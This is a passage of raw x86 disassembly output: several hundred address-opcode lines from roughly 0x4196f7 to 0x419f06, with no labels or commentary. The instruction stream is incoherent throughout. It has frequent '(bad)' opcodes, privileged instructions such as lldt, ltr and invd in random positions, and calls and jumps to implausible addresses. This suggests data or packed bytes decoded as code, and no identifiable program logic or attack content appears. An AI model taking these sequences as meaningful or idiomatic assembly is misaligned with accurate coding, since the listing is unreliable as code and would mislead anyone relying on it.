  4196f7:	sbb    cl,dl
  4196f9:	dec    ebp
  4196fa:	sar    DWORD PTR [ebx],cl
  4196fc:	push   ebp
  4196fd:	jne    0x41970e
  4196ff:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  419705:	lea    ebx,[eax]
  419707:	call   0xf4cb22ce
  41970c:	sbb    dh,dl
  41970e:	add    edx,ebx
  419710:	push   ebp
  419711:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  419717:	push   ecx
  419718:	mov    DWORD PTR [eax-0x30],edx
  41971b:	test   DWORD PTR [edx],eax
  41971d:	xadd   esp,esi
  419720:	pop    es
  419721:	add    cl,dl
  419723:	mov    eax,ecx
  419725:	or     al,0x45
  419727:	(bad)  
  419728:	push   eax
  419729:	add    DWORD PTR [edx+0x0],eax
  41972c:	add    ecx,DWORD PTR [ecx]
  41972e:	and    dh,cl
  419730:	call   0xc5a000
  419735:	add    DWORD PTR [ebp+0x0],edx
  419738:	mov    esp,DWORD PTR [ebp+0x18]
  41973b:	add    BYTE PTR [eax+0x54],cl
  41973e:	xor    eax,DWORD PTR [eax]
  419740:	add    esp,DWORD PTR [esi+0x3b]
  419743:	inc    ebp
  419744:	je     0x4196c9
  419746:	push   ecx
  419747:	cli    
  419748:	dec    ebp
  419749:	mov    DWORD PTR [ebx],eax
  41974b:	(bad)  
  41974c:	or     al,0x5e
  41974e:	inc    eax
  41974f:	add    BYTE PTR [ebx],al
  419751:	data16 and BYTE PTR [ebp+0x50],al
  419755:	sub    DWORD PTR [ecx],0xfffffff8
  419758:	add    BYTE PTR [ebp-0x75],ah
  41975b:	add    BYTE PTR [eax],bl
  41975d:	enter  0x894d,0x8b
  419761:	int3   
  419762:	loopne 0x419726
  419764:	rol    BYTE PTR [eax],0x33
  419767:	lea    cx,[ebp+0xa]
  41976b:	data16 jb 0x4197b3
  41976e:	add    BYTE PTR [ebx+0x44890855],cl
  419774:	sbb    ah,al
  419776:	inc    ebp
  419777:	lldt   WORD PTR ds:[edx+0x66]
  41977c:	xor    ecx,DWORD PTR [eax]
  41977e:	sub    eax,DWORD PTR [ebx+ecx*4]
  419781:	add    BYTE PTR [esi+eiz*2],cl
  419784:	ror    edx,cl
  419786:	dec    ebp
  419787:	inc    ebp
  419788:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  41978e:	cld    
  41978f:	or     BYTE PTR [edi+0x4501dd],dl
  419795:	(bad)  
  419796:	into   
  419797:	out    dx,al
  419798:	retf   
  419799:	(bad)  
  41979a:	dec    ebp
  41979b:	mov    al,0x8b
  41979d:	loop   0x4197bf
  41979f:	cmp    ecx,DWORD PTR [edx]
  4197a1:	inc    ebp
  4197a2:	daa    
  4197a3:	loop   0x41972c
  4197a5:	out    dx,al
  4197a6:	add    edi,eax
  4197a8:	add    BYTE PTR [eax+0x3f52e155],bh
  4197ae:	push   ebp
  4197af:	inc    ebp
  4197b0:	xor    ebx,esp
  4197b2:	add    ebp,esi
  4197b4:	push   edx
  4197b5:	push   bp
  4197b7:	inc    ebp
  4197b8:	(bad)  
  4197b9:	in     eax,dx
  4197ba:	push   esp
  4197bb:	(bad)  
  4197bc:	inc    edx
  4197be:	sbb    al,0x33
  4197c0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4197c7:	add    BYTE PTR [ebp+0x47],0x8b
  4197cb:	jmp    0xf98b:0x100041c8
  4197d2:	xor    esi,DWORD PTR [edx+0x3]
  4197d5:	mov    ecx,DWORD PTR [edi]
  4197d7:	fmul   DWORD PTR [edx]
  4197d9:	add    BYTE PTR [eax],al
  4197db:	lea    eax,[ebx-0x4700273c]
  4197e1:	add    al,0x4f
  4197e3:	pop    DWORD PTR [eax]
  4197e5:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4197eb:	push   edx
  4197ec:	inc    WORD PTR [ebp+0x8]
  4197f0:	mov    eax,0x514f4d
  4197f5:	(bad)
  4197f9:	add    al,al
  4197fb:	xor    DWORD PTR [ebx-0x74baf730],eax
  419801:	test   DWORD PTR [esi+0x74],esp
  419804:	inc    ebp
  419805:	mov    DWORD PTR [eax+0xa4e08],edi
  41980b:	add    BYTE PTR [ecx-0x76c435bb],cl
  419811:	or     dh,cl
  419813:	or     eax,0x8b8d5045
  419818:	inc    ebp
  419819:	mov    WORD PTR [ecx+0x3b8a00],?
  41981f:	jne    0x419854
  419821:	mov    edi,DWORD PTR [edx+0x8f3b18]
  419827:	add    DWORD PTR [ebx],eax
  419829:	add    bh,bh
  41982b:	adc    DWORD PTR [eax],ecx
  41982d:	adc    DWORD PTR [ebp+0x55],edi
  419830:	push   es
  419831:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  419837:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  41983e:	inc    ebp
  41983f:	mov    esp,edi
  419841:	or     al,0xdc
  419843:	push   eax
  419844:	(bad)  
  419845:	jne    0x4197fb
  419847:	call   0x399138
  41984c:	inc    ebp
  41984d:	sar    BYTE PTR [edx],0x84
  419850:	out    dx,al
  419851:	add    bh,al
  419853:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41985a:	(bad)  
  41985b:	and    al,al
  41985d:	fs in  eax,dx
  41985f:	inc    DWORD PTR [ebp-0x7b]
  419862:	jo     0x419873
  419864:	leave  
  419865:	scas   al,BYTE PTR es:[edi]
  419866:	inc    esp
  419867:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41986e:	or     BYTE PTR [ebx-0x97717c9],0x83
  419875:	call   DWORD PTR [edi]
  419877:	shr    ah,0x84
  41987a:	xchg   DWORD PTR [eax],eax
  41987c:	add    DWORD PTR [eax],eax
  41987e:	add    bh,bh
  419880:	dec    ebp
  419881:	and    BYTE PTR [ecx-0x38],dl
  419884:	push   eax
  419885:	dec    DWORD PTR [ebx+0xfd885]
  41988b:	mov    BYTE PTR [ebp+0x508bac00],cl
  419891:	mov    WORD PTR [ecx+0x0],ss
  419894:	lea    ecx,[ebx+0x108b20d8]
  41989a:	mov    WORD PTR [edx],ds
  41989c:	add    BYTE PTR [edi+0xff01ff],al
  4198a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4198a5:	push   ecx
  4198a6:	shl    BYTE PTR [ebp+0x3a],0x8b
  4198aa:	inc    ebp
  4198ab:	in     al,0xeb
  4198ad:	jno    0x41983a
  4198af:	push   edx
  4198b0:	mov    DWORD PTR [eax-0x28],edx
  4198b3:	mov    eax,DWORD PTR [ebp+0x20]
  4198b6:	je     0x41983f
  4198b8:	mov    eax,DWORD PTR [ecx]
  4198ba:	sbb    BYTE PTR [eax],al
  4198bc:	pop    DWORD PTR [eax]
  4198be:	add    esi,eax
  4198c0:	add    bl,al
  4198c2:	adc    DWORD PTR [edi],esi
  4198c4:	jmp    0x8bcce916
  4198c9:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4198d0:	jne    0x41985d
  4198d2:	mov    ecx,DWORD PTR [eax]
  4198d4:	in     al,0x75
  4198d6:	pop    DWORD PTR [ecx+0x5501]
  4198dc:	push   edx
  4198dd:	inc    DWORD PTR [ebx]
  4198df:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4198e5:	add    BYTE PTR [edi+0x9],dl
  4198e8:	call   DWORD PTR [esi]
  4198ea:	and    dl,al
  4198ec:	and    bh,bh
  4198ee:	inc    edi
  4198f0:	test   eax,edx
  4198f2:	sldt   ebx
  4198f5:	xor    BYTE PTR [eax],al
  4198f7:	pushf  
  4198f8:	(bad)  
  4198f9:	jmp    0x419907
  4198fb:	mov    eax,edi
  4198fd:	or     al,0x75
  4198ff:	inc    eax
  419900:	call   0x419008
  419905:	mov    eax,eax
  419907:	loopne 0x41988d
  419909:	inc    ebp
  41990a:	add    BYTE PTR [ebx+0x1451c00],cl
  419910:	mov    eax,DWORD PTR [ebp+0x20]
  419913:	add    edi,ecx
  419915:	add    BYTE PTR [eax],ch
  419917:	cmp    edi,0x18
  41991a:	test   DWORD PTR [ebp+0xf],esi
  41991d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  419924:	jne    0x419928
  419926:	call   0xffa093eb
  41992b:	leave  
  41992c:	rcr    BYTE PTR [esp+eax*4],0x55
  419930:	add    ah,ch
  419932:	add    BYTE PTR [edi-0x48fef979],dh
  419938:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41993f:	inc    esp
  419940:	mov    ebx,DWORD PTR [eax]
  419942:	fcom   st(2)
  419944:	add    BYTE PTR [edi],bl
  419946:	lea    ecx,[eax-0x18]
  419949:	(bad)  
  41994a:	push   DWORD PTR [ecx]
  41994c:	call   0xffb3e6ae
  419951:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  419955:	fstp   DWORD PTR [esi+ebx*8]
  419958:	push   ebp
  419959:	pop    ebp
  41995a:	mov    esi,DWORD PTR [edx-0x38]
  41995d:	add    DWORD PTR [eax],0x28
  419960:	mov    edi,DWORD PTR [ebx]
  419962:	xor    esi,DWORD PTR [edx+0x3]
  419965:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  419969:	pop    ebp
  41996a:	or     al,0x4
  41996c:	inc    ecx
  41996d:	push   ebp
  41996e:	(bad)  
  41996f:	in     al,dx
  419970:	or     ah,ch
  419972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419973:	xbegin 0xffc70f69
  419979:	clc    
  41997a:	adc    al,0x45
  41997c:	div    BYTE PTR [eax]
  41997e:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  419985:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  41998c:	jno    0x4199f4
  41998e:	add    eax,DWORD PTR [ebp+0x52]
  419991:	adc    eax,0xffffffa0
  419994:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  41999a:	test   DWORD PTR [eax],eax
  41999c:	clc    
  41999d:	data16 or al,BYTE PTR [ebp+0x45]
  4199a1:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4199a8:	rol    BYTE PTR [ebp+0x45],1
  4199ab:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4199b1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4199b7:	push   ebx
  4199b8:	add    BYTE PTR [ebp+0x0],dl
  4199bb:	push   ecx
  4199bc:	jge    0x4199f1
  4199be:	add    BYTE PTR [esi+0x4],dl
  4199c1:	jne    0x419a28
  4199c3:	mov    edx,0x457200
  4199c8:	jmp    0x41998c
  4199ca:	xor    edi,DWORD PTR [ebx]
  4199cc:	pop    edi
  4199cd:	cvtdq2ps xmm7,xmm0
  4199d0:	ret    0x0
  4199d3:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4199d9:	xor    ecx,DWORD PTR [edi]
  4199db:	add    eax,DWORD PTR [ecx+0x3b]
  4199de:	push   ebx
  4199df:	rdpmc  
  4199e1:	out    0x8d,al
  4199e3:	add    BYTE PTR [eax],cl
  4199e5:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4199eb:	ret    0x450c
  4199ee:	sbb    al,0x8b
  4199f0:	cmp    eax,esi
  4199f2:	or     cl,al
  4199f4:	or     al,0xc2
  4199f6:	pop    eax
  4199f7:	inc    ebp
  4199f8:	add    ecx,DWORD PTR [edi]
  4199fa:	add    esi,DWORD PTR [ebp+0x39]
  4199fd:	invd   
  4199ff:	jge    0x419a0b
  419a01:	mov    eax,0x478ac0
  419a06:	cli    
  419a07:	xor    esp,ecx
  419a09:	mov    ebx,0x5b8ac0
  419a0e:	ret    0x33
  419a11:	mov    eax,0x833b8b
  419a16:	sub    BYTE PTR [ebx],al
  419a18:	inc    ebp
  419a19:	xor    ax,di
  419a1c:	pushf  
  419a1d:	inc    bh
  419a1f:	mov    esp,esp
  419a21:	hlt    
  419a22:	test   DWORD PTR [ebp-0x8],esi
  419a25:	mov    eax,DWORD PTR [ebp-0x14]
  419a28:	xor    ecx,DWORD PTR [ebx-0x76478864]
  419a2e:	dec    edi
  419a2f:	or     BYTE PTR [eax],al
  419a31:	jne    0x4199bc
  419a33:	mov    esi,esp
  419a35:	call   0x77a825fa
  419a3a:	inc    ebp
  419a3b:	mov    DWORD PTR [eax+0x9c4f0c],edi
  419a41:	add    BYTE PTR [ecx-0x3ffe0717],cl
  419a47:	add    BYTE PTR [esi+0x7d],ah
  419a4a:	inc    ebp
  419a4b:	mov    bx,WORD PTR [ebp+0x8]
  419a4f:	add    DWORD PTR [ebp+0x55],0x30c008b
  419a56:	inc    ebp
  419a57:	mov    bx,di
  419a5a:	lock test BYTE PTR [ecx+0x7000801],bh
  419a61:	jge    0x419a24
  419a63:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  419a69:	cli    
  419a6a:	xor    bl,bh
  419a6c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  419a72:	test   BYTE PTR [eax],cl
  419a74:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  419a7b:	cmp    ebp,eax
  419a7d:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  419a84:	test   BYTE PTR [ebp+0x1],bh
  419a87:	mov    ebx,0x458a00
  419a8c:	xor    esi,DWORD PTR [ebx]
  419a8e:	add    esp,DWORD PTR [esi-0x77]
  419a91:	pop    ebp
  419a92:	loopne 0x419afa
  419a94:	inc    ebp
  419a95:	clc    
  419a96:	xor    edi,DWORD PTR [ebx]
  419a98:	add    esi,DWORD PTR [edx-0x77]
  419a9b:	data16 fdivr QWORD PTR [ebp-0x49]
  419a9f:	mov    ebx,0xb78afc
  419aa4:	hlt    
  419aa5:	xor    edi,DWORD PTR [esi]
  419aa7:	data16 add BYTE PTR [ebp+0x66],bl
  419aab:	data16 lock clc 
  419aae:	cmp    eax,DWORD PTR ds:[eax]
  419ab1:	ja     0x419b19
  419ab3:	psubq  mm7,QWORD PTR [ebp+0x4]
  419ab7:	ltr    WORD PTR [ebp+0x66]
  419abb:	add    esi,eax
  419abd:	add    di,WORD PTR [ebp+0x2b]
  419ac1:	data16 data16 jge 0x419b42
  419ac5:	mov    ebx,0xe08a8b
  419aca:	jge    0x419aff
  419acc:	data16 data16 xor al,0x5d
  419ad0:	data16 data16 jne 0x419acc
  419ad4:	mov    edi,DWORD PTR [ebx]
  419ad6:	fdiv   QWORD PTR [edx+0x7d]
  419ad9:	data16 data16 jge 0x419b11
  419add:	mov    ebx,0x758a66
  419ae2:	mov    esi,0x667233
  419ae7:	pop    ebp
  419ae8:	or     BYTE PTR [esi+0x0],ah
  419aeb:	clc    
  419aec:	mov    edi,DWORD PTR [ebx]
  419aee:	lock ja 0x419a7c
  419af1:	(bad)  
  419af3:	jge    0x419aec
  419af5:	invd   
  419af7:	pop    ebp
  419af8:	add    BYTE PTR [ebx],al
  419afa:	(bad)  
  419afb:	cmp    di,WORD PTR [ebp+0xf]
  419aff:	data16 sbb bh,BYTE PTR [ebp+0x0]
  419b03:	mov    bx,WORD PTR [ebp-0x10]
  419b07:	pop    bp
  419b09:	fbstp  TBYTE PTR [ebx]
  419b0b:	test   DWORD PTR [ebx],eax
  419b0d:	add    BYTE PTR [ebx],bh
  419b0f:	add    BYTE PTR [esi+0x7d],ah
  419b12:	jge    0x419a9f
  419b14:	data16 in al,dx
  419b16:	pop    ebp
  419b17:	stc    
  419b18:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  419b1f:	mov    edi,ebx
  419b21:	in     al,dx
  419b22:	test   BYTE PTR [ebp+0x0],bh
  419b25:	mov    eax,DWORD PTR [eax]
  419b27:	call   0xbd3e94b7
  419b2c:	ds pushf 
  419b2e:	add    BYTE PTR [edx],dh
  419b30:	mov    bx,di
  419b33:	call   0x8b4a18c3
  419b38:	add    ebp,esp
  419b3a:	mov    bx,di
  419b3d:	jnp    0x419b65
  419b3f:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  419b45:	mov    eax,DWORD PTR [eax]
  419b47:	call   0x7c3d26b2
  419b4c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  419b52:	data16 data16 fistp WORD PTR [ebp+0xe]
  419b57:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  419b61:	fisttp WORD PTR [ecx-0x7401f77b]
  419b67:	(bad)  
  419b68:	cld    
  419b69:	jne    0x419ba9
  419b6b:	xor    eax,DWORD PTR [eax]
  419b6d:	mov    esp,DWORD PTR [esi-0x10]
  419b70:	sti    
  419b71:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  419b78:	data16 adc bl,bh
  419b7b:	push   ebp
  419b7c:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  419b83:	mov    WORD PTR [eax],es
  419b85:	pushf  
  419b86:	data16 xor bh,bl
  419b89:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  419b8f:	mov    esp,DWORD PTR [esi-0x14]
  419b92:	fisttp WORD PTR [ebx-0x3748a9f2]
  419b98:	or     al,0x2b
  419b9a:	mov    bh,0xba
  419b9c:	hlt    
  419b9d:	mov    bh,bl
  419b9f:	add    BYTE PTR [ecx-0x7446f3cd],cl
  419ba5:	dec    esi
  419ba6:	or     al,0x0
  419ba8:	mov    edi,DWORD PTR [ebx]
  419baa:	or     BYTE PTR [ebp+0x3b],dh
  419bad:	mov    ecx,DWORD PTR [edi]
  419baf:	fdivr  QWORD PTR [ebx-0x7499ff83]
  419bb5:	xor    al,0xd8
  419bb7:	pop    bp
  419bb9:	lock xor esi,DWORD PTR [ebx]
  419bbc:	lea    esp,[esi+0x1f]
  419bbf:	icebp  
  419bc0:	jb     0x419bc6
  419bc2:	add    al,al
  419bc4:	jge    0x419bd2
  419bc6:	mov    eax,eax
  419bc8:	fsubr  st,st(3)
  419bca:	pop    ebp
  419bcb:	mov    esi,DWORD PTR [ebx]
  419bcd:	in     al,0x8d
  419bcf:	rcr    DWORD PTR [edi],0xc2
  419bd2:	jb     0x419c32
  419bd4:	add    cl,cl
  419bd6:	jge    0x419be4
  419bd8:	mov    edx,DWORD PTR [ebp-0x20]
  419bdb:	in     al,dx
  419bdc:	pop    ebp
  419bdd:	data16 data16 or BYTE PTR [esi+edi*4],bh
  419be2:	cmp    di,WORD PTR [ebp+0x0]
  419be6:	mov    ebp,DWORD PTR [ebx]
  419be8:	fdivr  QWORD PTR [esi+0x668a5d]
  419bee:	cmp    al,0x33
  419bf0:	mov    si,0x4e7d
  419bf4:	mov    eax,DWORD PTR [eax]
  419bf6:	lock inc ebp
  419bf8:	mov    esi,DWORD PTR [esi]
  419bfa:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  419c01:	clc    
  419c02:	(bad)  
  419c03:	cmp    edi,DWORD PTR [ebx]
  419c05:	je     0x419c16
  419c07:	push   ebx
  419c08:	loopne 0x419c19
  419c0a:	dec    ecx
  419c0c:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  419c10:	icebp  
  419c11:	mov    esi,0x703084d
  419c16:	pcmpgtd mm6,mm1
  419c19:	add    BYTE PTR [ebp+0x66],dh
  419c1c:	jmp    0x419be9
  419c1e:	mov    eax,DWORD PTR [ebx]
  419c20:	lock push ebp
  419c22:	ror    DWORD PTR [ebp-0x2972feb3],1
  419c28:	or     bh,dl
  419c2a:	jb     0x419c2a
  419c2c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  419c32:	loopne 0x419c34
  419c34:	jne    0x419c3a
  419c36:	data16 add BYTE PTR [esi+eiz*2],dh
  419c3a:	mov    ecx,ebx
  419c3c:	data16 ds icebp 
  419c3f:	add    BYTE PTR [esi],bh
  419c41:	data16 add bl,cl
  419c44:	retw   0xf2
  419c48:	ret    0x66
  419c4b:	retf   
  419c4c:	enterw 0x4df1,0x19
  419c51:	pop    edi
  419c52:	jne    0x419bd5
  419c54:	mov    esi,DWORD PTR [esi]
  419c56:	call   0x77b627f7
  419c5b:	xor    ebp,DWORD PTR [ebx]
  419c5d:	lea    esp,[esi+0x48]
  419c60:	repnz in eax,0x3b
  419c63:	add    BYTE PTR [ebp-0x37],dh
  419c66:	xor    edx,DWORD PTR [ebp-0x15]
  419c69:	in     al,dx
  419c6a:	xor    edx,DWORD PTR [esi+0x40]
  419c6d:	mov    DWORD PTR [edi],0x338545fc
  419c73:	clc    
  419c74:	add    esi,DWORD PTR [ecx]
  419c76:	pop    edi
  419c77:	pushf  
  419c78:	pop    ebx
  419c79:	call   0xff429c40
  419c7e:	mov    edi,eax
  419c80:	push   ecx
  419c81:	pop    es
  419c82:	mov    esi,DWORD PTR [edi]
  419c84:	push   esi
  419c85:	inc    edi
  419c86:	add    al,0x70
  419c88:	add    BYTE PTR [ecx+0x66],ah
  419c8b:	(bad)  
  419c8c:	into   
  419c8d:	fs ds int 0x0
  419c91:	mov    ecx,0x7ce0866
  419c96:	ret    0x66
  419c99:	add    bh,al
  419c9b:	add    al,0xfc
  419c9d:	add    BYTE PTR [ebp+0x31c3f866],al
  419ca3:	ds pushf 
  419ca5:	add    BYTE PTR [esi+0x66],ah
  419ca8:	into   
  419ca9:	ret    
  419caa:	pop    ebp
  419cab:	adc    al,0x57
  419cad:	add    BYTE PTR [edi-0x723c409a],dh
  419cb3:	add    edi,edi
  419cb5:	jne    0x419d0c
  419cb7:	lea    edx,[ecx+0x1]
  419cba:	mov    ebx,0xd64ff1
  419cbf:	sar    DWORD PTR [ebx],1
  419cc1:	test   BYTE PTR [ebp+0x38],dh
  419cc4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  419cc8:	push   edi
  419cc9:	xor    BYTE PTR [ebx],0x37
  419ccc:	mov    esi,ebx
  419cce:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  419cd4:	cmp    BYTE PTR [ebp+0x64],al
  419cd7:	pop    ebx
  419cd8:	mov    ebx,0x9c3b36
  419cdd:	je     0x419d0a
  419cdf:	xor    edi,DWORD PTR [ebx+0x668a33]
  419ce5:	mov    WORD PTR [ebx],?
  419ce7:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  419ced:	pop    edi
  419cee:	cmp    ecx,ecx
  419cf0:	jne    0x419d47
  419cf2:	mov    ebp,esp
  419cf4:	cld    
  419cf5:	push   esi
  419cf6:	pop    ebx
  419cf7:	inc    ebp
  419cf8:	stc    
  419cf9:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  419d01:	clc    
  419d02:	test   dl,dl
  419d04:	cmp    bh,bh
  419d06:	fs pop si
  419d09:	or     bl,al
  419d0b:	add    al,0x8b
  419d0d:	add    BYTE PTR [ecx+0x66],dl
  419d10:	push   edi
  419d11:	retf   0x3e45
  419d14:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  419d1c:	clc    
  419d1d:	add    BYTE PTR [ebx+0x66],bl
  419d20:	dec    edx
  419d22:	mov    edx,DWORD PTR [edi-0x76]
  419d25:	push   edi
  419d26:	add    al,0xb7
  419d28:	xor    al,0xba
  419d2a:	cmp    al,0x8d
  419d2c:	je     0x419d2d
  419d2e:	mov    edx,DWORD PTR [ebp-0x46]
  419d31:	push   ecx
  419d32:	lea    edi,[ebx+0x554fff]
  419d38:	push   ecx
  419d39:	cmp    edx,DWORD PTR [ebx+0x75]
  419d3c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  419d42:	add    BYTE PTR [ebx],dh
  419d44:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  419d4a:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  419d51:	mov    ebx,0x3b3b00
  419d56:	jne    0x419d83
  419d58:	mov    DWORD PTR [ebx+0x728afc],edi
  419d5e:	xor    esi,DWORD PTR [ebx]
  419d60:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  419d66:	push   edi
  419d67:	cmp    esp,ebp
  419d69:	jne    0x419d6b
  419d6b:	sbb    DWORD PTR [eax],0x8085c3fc
  419d71:	clc    
  419d72:	inc    edi
  419d73:	pop    ebx
  419d74:	sti    
  419d75:	add    eax,0xeb8bc075
  419d7a:	cld    
  419d7b:	xor    edi,DWORD PTR ds:0xf8c3855e
  419d81:	mov    ecx,DWORD PTR [ecx+edx*2]
  419d84:	rol    DWORD PTR [ebp-0x37],0xf
  419d88:	mov    DWORD PTR [eax],ecx
  419d8a:	inc    edi
  419d8b:	(bad)  
  419d8c:	in     eax,0xfc
  419d8e:	add    bh,bh
  419d90:	(bad)  
  419d91:	mov    esi,0xc38a5e
  419d96:	mov    esi,DWORD PTR [ebx]
  419d98:	push   ecx
  419d99:	mov    edi,0xfc4ec7
  419d9e:	test   DWORD PTR [ebp-0x8],edx
  419da1:	xor    di,ax
  419da4:	pushf  
  419da5:	sub    ebp,eax
  419da7:	inc    ebp
  419da8:	(bad)  
  419da9:	sub    edi,edi
  419dab:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  419db1:	inc    ebp
  419db2:	add    BYTE PTR [esi+0x2b],ah
  419db5:	or     bh,BYTE PTR [edx+0xf8ac2]
  419dbb:	cmp    al,0x33
  419dbd:	mov    edi,DWORD PTR [edx+0xfc4e81]
  419dc3:	(bad)  
  419dc4:	cmp    esi,DWORD PTR [ebx]
  419dc6:	je     0x419d80
  419dc8:	push   ebx
  419dc9:	dec    esi
  419dca:	str    ecx
  419dcd:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  419dd1:	xor    edi,DWORD PTR [edi+0x789085f]
  419dd7:	mov    edx,DWORD PTR [esp+edi*8]
  419dda:	add    cl,cl
  419ddc:	data16 add al,0xcb
  419ddf:	push   ebp
  419de0:	add    ebp,esp
  419de2:	jne    0x419dd0
  419de4:	(bad)  
  419de5:	mov    DWORD PTR [ecx],0xd685f7ec
  419deb:	clc    
  419dec:	xlat   BYTE PTR ds:[ebx]
  419ded:	inc    ebp
  419dee:	mov    esi,DWORD PTR [eax]
  419df0:	push   eax
  419df1:	pushf  
  419df2:	in     eax,0x8b
  419df4:	add    ah,ch
  419df6:	add    al,0x55
  419df8:	add    BYTE PTR [ecx+0x66],dl
  419dfb:	add    eax,0x3e72cb
  419e00:	add    BYTE PTR [ebp+0x66],al
  419e03:	(bad)  
  419e04:	retf   
  419e05:	lock ret 0x85
  419e09:	clc    
  419e0a:	inc    bp
  419e0c:	retf   
  419e0d:	cmp    eax,0xc77d9cc8
  419e12:	ss cld 
  419e14:	pushf  
  419e15:	test   DWORD PTR [edi-0x8],ebx
  419e18:	je     0x419e5f
  419e1a:	xor    esi,DWORD PTR ds:0x7020840
  419e20:	ror    BYTE PTR [ebp-0x37],0x8d
  419e24:	push   ebp
  419e25:	add    esp,ebp
  419e27:	jb     0x419db4
  419e29:	add    BYTE PTR [eax],cl
  419e2b:	dec    ebp
  419e2c:	mov    bh,0x81
  419e2e:	push   esi
  419e2f:	push   ebp
  419e30:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  419e37:	xor    al,BYTE PTR [eax]
  419e39:	mov    edx,DWORD PTR [edi+0x10]
  419e3c:	(bad)  
  419e3d:	scas   eax,DWORD PTR es:[edi]
  419e3e:	ret    0x3b
  419e41:	jns    0x3b429b34
  419e47:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  419e4b:	dec    ebp
  419e4c:	or     BYTE PTR [ebx],ch
  419e4e:	ret    0x458b
  419e51:	lock jmp 0x419e45
  419e54:	mov    ecx,DWORD PTR [eax]
  419e56:	or     BYTE PTR [edi],al
  419e58:	mov    ecx,eax
  419e5a:	xor    DWORD PTR [edx+0x2],0x0
  419e5e:	mov    bh,0xc1
  419e60:	adc    BYTE PTR [eax],dh
  419e62:	iret   
  419e63:	inc    ebp
  419e64:	mov    DWORD PTR [ebx],0x4dfff8c4
  419e6a:	inc    BYTE PTR [ebx]
  419e6c:	ret    0xf8
  419e6f:	adc    DWORD PTR [esi+0x10],esp
  419e72:	clc    
  419e73:	dec    ecx
  419e74:	fisttp WORD PTR [ecx+0x456604c0]
  419e7a:	add    dh,BYTE PTR ds:0x75e0845
  419e80:	ret    0x4d
  419e83:	lea    ecx,[ebx+0x18728301]
  419e89:	add    BYTE PTR [ebp+0x45],al
  419e8c:	xor    ecx,ebp
  419e8e:	pushf  
  419e8f:	add    bh,al
  419e91:	add    al,ch
  419e93:	inc    ebp
  419e94:	test   DWORD PTR [ebx-0x3eba0708],ecx
  419e9a:	xor    eax,0x781084d
  419e9f:	push   ebp
  419ea0:	pushf  
  419ea1:	push   ecx
  419ea2:	xor    al,BYTE PTR [ecx+0x32f89c89]
  419ea8:	inc    ebp
  419ea9:	cmp    edi,DWORD PTR [ecx]
  419eab:	jbe    0x419e49
  419ead:	mov    eax,edi
  419eaf:	or     ah,dh
  419eb1:	inc    ebp
  419eb2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  419eb8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  419ebe:	in     al,dx
  419ebf:	hlt    
  419ec0:	push   ebp
  419ec1:	push   ebp
  419ec2:	push   ecx
  419ec3:	push   ecx
  419ec4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  419eca:	pushf  
  419ecb:	pushf  
  419ecc:	xor    dh,BYTE PTR [edx]
  419ece:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  419ed4:	or     BYTE PTR [ebp+0x7],al
  419ed7:	mov    eax,ecx
  419ed9:	clc    
  419eda:	jb     0x419e9d
  419edc:	add    BYTE PTR [ebp+0x55],cl
  419edf:	or     DWORD PTR [edi],0xc251d155
  419ee5:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  419eef:	mov    edi,eax
  419ef1:	or     cl,al
  419ef3:	inc    ebp
  419ef4:	dec    ebp
  419ef5:	mov    eax,DWORD PTR [ecx+0x514d550c]
  419efb:	or     WORD PTR [ecx],0x899c
  419f00:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  419f06:	mov    edx,DWORD PTR [ecx+0x8]
